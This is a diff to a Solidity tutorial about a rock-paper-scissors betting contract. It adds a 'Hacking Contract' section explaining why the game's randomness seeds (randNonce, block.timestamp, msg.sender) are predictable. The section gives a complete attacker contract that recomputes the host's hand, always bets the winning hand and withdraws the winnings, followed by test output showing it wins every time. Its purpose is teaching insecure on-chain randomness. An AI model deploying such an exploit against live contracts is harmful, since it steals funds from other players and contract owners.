@@ -21,13 +21,14 @@ If the fomo timer goes to zero, the last bettor that either turned on or extende
 
 ## What will you learn?
 
-1. Enum
+1. [Enum](https://docs.soliditylang.org/en/v0.8.5/types.html#enums)
 2. [Events](https://docs.soliditylang.org/en/v0.8.5/contracts.html#events) and `indexed`, and "topic"??
 3. `payable` function
 4. Random Number
 5. `receive` function
 6. **Underflow** and **Overflow**
 7. truffle test
+8. **Hacking Contracts** 🤪🤪🤪
 
 ## What is the most difficult challenge?
 
@@ -157,6 +158,176 @@ Once a node has solved the PoW, the other nodes stop trying to solve the PoW, ve
 Let's say we had a coin flip contract — heads you double your money, tails you lose everything. Let's say it used the above random function to determine heads or tails. (`random >= 50` is heads, `random < 50` is tails).
 
 If I were running a node, I could publish a transaction **only to my own node** and not share it. I could then run the coin flip function to see if I won — and if I lost, choose not to include that transaction in the next block I'm solving. I could keep doing this indefinitely until I finally won the coin flip and solved the next block, and profit.
+
+### Hacking Contract
+
+The game contract looks beautiful, seems to work very nice. Also, look at the random function, it looks very complicated, and seems not to be hackable simply.
+
+The game contract uses three different seeds for its' random function.
+
+- randNonce - Increases every time once generated a random number. Prevents transaction reusing.
+- block.timestamp - Provides variant based on time.
+- msg.sender - The sender address. Prevents multi-transaction attacks.
+
+Unfortunately, all those three are vulnerable.
+
+- randNonce - publically readable on the blockchain, remember that nothing is hidden on the blockchain.
+- block.timestamp - unlike any other program language, it doesn't represent the elapsed time of the function execution. All same across the transaction chain.
+- msg.sender - Huh, ridiculous! 😝
+
+Too many words, just wanna see?
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity >=0.8.5 <0.9.0;
+
+import "./LevelOne.sol";
+
+contract Hacker {
+  address payable public hacker;
+
+  modifier onlyHacker {
+    require(msg.sender == hacker, "caller is not the hacker");
+    _;
+  }
+
+  constructor() {
+    hacker = payable(msg.sender);
+  }
+
+  /**
+   * Attack the game contract.
+   *
+   * @param _target - The address of the game contract
+   * @param _hostRandNonce - The randNonce of the game contract, front-end will read the game's storage and let hacker know the value. 🤪🤪🤪
+   */
+  function attack(address _target, uint256 _hostRandNonce)
+    public
+    payable
+    onlyHacker
+  {
+    // Simulate the host's hand. 😝😝😝
+    LevelOne.Hand hostHand = getHostHand(_hostRandNonce);
+    // Guess the winning hand depends on host's one.
+    LevelOne.Hand hackerHand = LevelOne.Hand((uint8(hostHand) + 1) % 3);
+
+    bytes memory sig = abi.encodeWithSignature("bet(uint8)", hackerHand);
+    bool result = false;
+
+    assembly {
+      // Load the length (first 32 bytes)
+      let len := mload(sig)
+      // Skip over the length field.
+      let data := add(sig, 0x20)
+      result := call(
+        gas(), // gas
+        _target, // target address
+        callvalue(), // ether
+        data, // input location
+        len, // length of input params
+        0, // output location
+        0 // no need to use output params
+      )
+    }
+
+    require(result, "Hacker: Failed!");
+  }
+
+  /**
+   * @dev Hacker simulates game's hand.
+   * @param _randNonce - The host's current randNonce, provided through front-end
+   *
+   * Get the host's hand based on random number.
+   *
+   * @return a different hand every time called.
+   */
+  function getHostHand(uint256 _randNonce)
+    internal
+    view
+    returns (LevelOne.Hand)
+  {
+    uint256 rand = randMod(90, _randNonce);
+    if (rand < 30) {
+      return LevelOne.Hand.rock;
+    } else if (rand < 60) {
+      return LevelOne.Hand.paper;
+    }
+    return LevelOne.Hand.scissors;
+  }
+
+  /**
+   * @dev Hacker simulates game's random function.
+   * @dev block.timestamp is the same as host gets.
+   * @dev Replace msg.sender with the current address.
+   * @param _randNonce - The host's current randNonce, provided through front-end
+   *
+   * Generate random number between 0 to _modulus.
+   * Not secure! 😞
+   *
+   * @param _modulus - The max - 1 of the random number range
+   */
+  function randMod(uint256 _modulus, uint256 _randNonce)
+    internal
+    view
+    returns (uint256)
+  {
+    return
+      uint256(
+        keccak256(
+          abi.encodePacked(block.timestamp, address(this), _randNonce + 1)
+        )
+      ) % _modulus;
+  }
+
+  /**
+   * Receive Ether.
+   * If hacker won, the game contract will send back twice of our bet.
+   */
+  receive() external payable {}
+
+  /**
+   * Withdraw Ether to owner, the only way to take back Ether for hacker.
+   * @dev you can transfer inside receive function, because insufficient gas to process, as the host use transfer to return Ether.
+   */
+  function withdraw() external onlyHacker {
+    hacker.transfer(address(this).balance);
+  }
+}
+
+```
+
+**Test Hacker**
+
+```
+Using network 'develop'.
+
+
+Compiling your contracts...
+===========================
+> Compiling .\contracts\Hacker.sol
+> Compiling .\contracts\LevelOne.sol
+> Compiled successfully using:
+   - solc: 0.8.5+commit.a4f2e591.Emscripten.clang
+
+
+
+  Contract: Hacker
+    should win always
+      √ should win (200ms)
+      √ should win (188ms)
+      √ should win (178ms)
+      √ should win (172ms)
+      √ should win (188ms)
+      √ should win (174ms)
+      √ should win (204ms)
+      √ should win (239ms)
+      √ should win (431ms)
+      √ should win (203ms)
+
+
+  10 passing (5s)
+
+```
 
 ## So how do we generate random numbers safely in Ethereum?
 
